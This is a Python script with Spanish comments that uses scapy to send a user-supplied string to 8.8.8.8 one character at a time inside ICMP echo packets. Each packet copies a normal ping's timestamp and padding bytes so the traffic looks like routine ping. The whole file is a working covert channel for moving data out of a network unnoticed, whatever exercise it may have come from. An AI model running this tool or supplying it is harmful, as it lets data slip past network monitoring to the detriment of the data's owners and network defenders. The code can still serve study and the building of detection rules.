#!/usr/bin/env python3
import sys
import time
from scapy.all import IP, ICMP, send, Raw
from datetime import datetime

def send_icmp_packets(data):
    dest_ip = "8.8.8.8"  # IP de destino (puedes cambiarlo si es necesario)
    sequence_number = 1
    identifier = 0x001c  # Cambia esto si deseas un valor diferente

    additional_data_hex = "33100000000000101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f3031323334353637"
    additional_data = bytes.fromhex(additional_data_hex).decode("utf-8")

    for char in data:

        current_time = datetime.now()
        # Formatear la fecha y hora actual en el formato deseado
        formatted_time = current_time.strftime('%b %d, %Y %H:%M:%S')
        # Convertir la cadena de fecha a un objeto datetime
        date_obj = datetime.strptime(formatted_time, '%b %d, %Y %H:%M:%S')
        # Obtener el timestamp UNIX (segundos desde la época)
        timestamp = int(date_obj.timestamp())
        # Convertir el timestamp en una cadena hexadecimal
        hex_timestamp = format(timestamp, 'x').zfill(16)
        # Invertir la cadena hexadecimal para formato little-endian
        hex_timestamp_little_endian = ''.join(reversed([hex_timestamp[i:i+2] for i in range(0, len(hex_timestamp), 2)]))
        # Convertir la cadena hexadecimal en bytes
        timestamp_bytes = bytes.fromhex(hex_timestamp_little_endian)
        full_data = char + additional_data
        icmp_packet = IP(dst=dest_ip)/ICMP(id=identifier, seq=sequence_number)/ Raw(timestamp_bytes) /full_data
        send(icmp_packet)
        sequence_number += 1
        time.sleep(0.1)  # Pausa breve entre paquetes para evitar inundar la red

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: {} <cadena>".format(sys.argv[0]))
        sys.exit(1)

    input_string = sys.argv[1]
    send_icmp_packets(input_string)



